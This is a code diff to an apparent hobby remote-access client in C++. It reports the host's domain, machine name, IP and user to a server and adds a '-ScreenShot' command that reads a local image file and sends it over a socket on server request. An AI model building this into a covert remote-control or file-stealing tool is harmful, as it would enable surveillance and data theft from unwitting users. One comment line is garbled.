@@ -1,5 +1,8 @@
 #include "client.h"
 
+#include <fstream>
+
+
 struct GET_PC_DATA_REQUSET
 {
     std::string domain;
@@ -52,7 +55,7 @@ bool GetDataPc(GET_PC_DATA_REQUSET &pc_data)
 int main()
 {
     const char ip_address[] = "127.0.0.1";
-    const int port = 77777;
+    const int port = 55555;
 
     // Initialize WinSock
     WSAData data{};
@@ -98,7 +101,8 @@ int main()
         return -1;
 
     // Send
-    std::string message = "C " + pc_data.domain + " " + pc_data.machine + " " + pc_data.ip + " " + pc_data.user + "\0";
+    // C++ and C++ std::string message = "C " + pc_data.domain + " " + pc_data.machine + " " + pc_data.ip + " " + pc_data.user + "\0";
+    std::string message = pc_data.domain + " " + pc_data.machine + " " + pc_data.ip + " " + pc_data.user;
     send(sock, message.c_str(), message.size() + 1, 0);
 
 
@@ -120,6 +124,21 @@ int main()
         if (command == "-Connect")
         {
             std::cout << "[Command from the server]: " << command << std::endl;;
+        }
+        else if (command == "-ScreenShot")
+        {
+            send(sock, "-ScreenShot", strlen("-ScreenShot") + 1, 0);
+
+            //C:\Users\Ziglot\Pictures
+            std::ifstream infile("C:\\Users\\Ziglot\\Pictures\\test.png", std::ios::binary);
+            infile.seekg(0, std::ios::end);
+            size_t file_size = infile.tellg();
+            char* data = new char[file_size];
+            infile.seekg(0, std::ios::beg);
+            infile.read(data, file_size);
+            int sendResult = send(sock, data, file_size, 0);
+            if (sendResult == SOCKET_ERROR)
+                std::cout << "Ошибка отправки данных" << std::endl;
         }
         else
         {
